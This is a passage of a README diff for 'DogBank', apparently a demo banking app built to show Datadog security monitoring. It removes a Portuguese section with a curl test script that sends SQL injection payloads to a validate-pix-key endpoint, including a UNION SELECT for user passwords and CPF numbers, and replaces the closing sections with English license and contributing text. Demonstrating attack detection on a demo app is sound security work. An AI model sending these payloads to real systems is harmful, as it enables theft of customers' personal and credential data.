-  "security_event": "sql_injection_vulnerable_endpoint",
-  "input_pix_key": "yuki.pix@email.com' OR '1'='1",
-  "endpoint": "/api/transactions/validate-pix-key"
-}
-2. APM Traces
-Filtre por:
-@appsec.event:true
-3. Application Security → Threats
-Vá para: https://app.datadoghq.com/security/appsec/threats
-Você verá:
-
-🚨 SQL Injection Attack Detected
-Severity: HIGH
-Attack Type: SQL Injection
-Payload: yuki.pix@email.com' OR '1'='1
-Service: transactions
-IP Address: Seu IP
-
-4. Security Signals
-https://app.datadoghq.com/security
-Datadog criará um Security Signal automaticamente:
-
-Rule: SQL Injection detected
-Status: Triggered
-Affected Service: transactions
-
-🎬 Script de Teste Completo
-bash#!/bin/bash
-
-BASE_URL="http://your-loadbalancer-url"
-
-echo "🔒 Testando SQL Injection no DogBank"
-echo ""
-
-# Teste 1: Normal
-echo "1️⃣ Query NORMAL:"
-curl -s "${BASE_URL}/api/transactions/validate-pix-key?pixKey=yuki.pix@email.com" | jq .
-echo ""
-
-# Teste 2: SQL Injection básico
-echo "2️⃣ SQL INJECTION - OR 1=1:"
-curl -s "${BASE_URL}/api/transactions/validate-pix-key?pixKey=' OR '1'='1" | jq .
-echo ""
-
-# Teste 3: Union-based
-echo "3️⃣ UNION-BASED SQL INJECTION:"
-curl -s "${BASE_URL}/api/transactions/validate-pix-key?pixKey=' UNION SELECT nome, senha, cpf, email, banco, chave_pix FROM usuarios--" | jq .
-echo ""
-
-# Teste 4: Comment-based
-echo "4️⃣ COMMENT-BASED:"
-curl -s "${BASE_URL}/api/transactions/validate-pix-key?pixKey=test'--" | jq .
-echo ""
-
-echo "✅ Verifique os ataques em: https://app.datadoghq.com/security/appsec/threats"
-📊 Resultado Esperado no Datadog ASM:
-┌─────────────────────────────────────────────────────────┐
-│ 🚨 SQL Injection Attack Detected                        │
-├─────────────────────────────────────────────────────────┤
-│ Time: 2025-10-10 17:30:45                               │
-│ Service: transactions                                    │
-│ Endpoint: /api/transactions/validate-pix-key            │
-│ Attack Type: SQL Injection                               │
-│ Severity: HIGH                                           │
-│ Payload: yuki.pix@email.com' OR '1'='1                  │
-│ Source IP: 177.45.xxx.xxx                                │
-│ User Agent: Mozilla/5.0...                               │
-├─────────────────────────────────────────────────────────┤
-│ 📊 Impact:                                               │
-│ • Unauthorized data access                               │
-│ • Potential data breach                                  │
-│ • Database structure exposure                            │
-└─────────────────────────────────────────────────────────┘
-Agora você tem uma demo COMPLETA de SQL Injection com detecção do Datadog ASM! 🎯🔒
-
 
 ---
 
-## 📝 Licença
+## 📝 License
 
-Este projeto é uma aplicação de demonstração para fins educacionais e de observabilidade.
-
----
-
-## 👥 Contato
-
-- **GitHub**: [@schawirin](https://github.com/schawirin)
-- **Projeto**: [DogBank](https://github.com/schawirin/Dogbank)
+This project is for **demonstration purposes only**. Do not use in production environments.
 
 ---
 
-## 🙏 Agradecimentos
+## 🤝 Contributing
 
-- [Datadog](https://www.datadoghq.com/) pela plataforma de observabilidade
-- [Spring Boot](https://spring.io/projects/spring-boot) pelo framework
-- [Traefik](https://traefik.io/) pelo ingress controller
+1. Fork the repository
+2. Create your feature branch (`git checkout -b feature/amazing-feature`)
+3. Commit your changes (`git commit -m 'feat: add amazing feature'`)
+4. Push to the branch (`git push origin feature/amazing-feature`)
+5. Open a Pull Request
 
 ---
 
-**🐕 Made with ❤️ by DogBank Team**
+## 📧 Support
+
+For questions or issues, please open a GitHub issue.
